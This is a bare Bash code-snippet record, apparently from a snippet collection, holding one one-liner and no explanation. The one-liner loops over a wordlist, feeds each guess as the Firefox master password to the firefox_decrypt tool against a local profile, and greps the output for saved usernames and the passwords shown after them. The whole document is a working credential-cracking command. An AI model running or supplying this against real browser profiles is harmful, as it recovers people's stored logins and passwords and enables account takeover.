---
id: ac31f5a3-92c6-497e-ac10-0c2212f83e1d
type: code
language: Bash
verified: false
created_at: '2019-10-23T21:39:44.669113+00:00'
updated_at: '2023-05-29T16:48:53.365139+00:00'
---

# Code Snippet ac31f5a3

**Language**: Bash

```bash
for guess in $(cat $WORDLIST); do echo $guess | python firefox_decrypt/firefox_decrypt.py .mozilla/firefox  2>&1 | grep 'Username:' -A 1; done
```
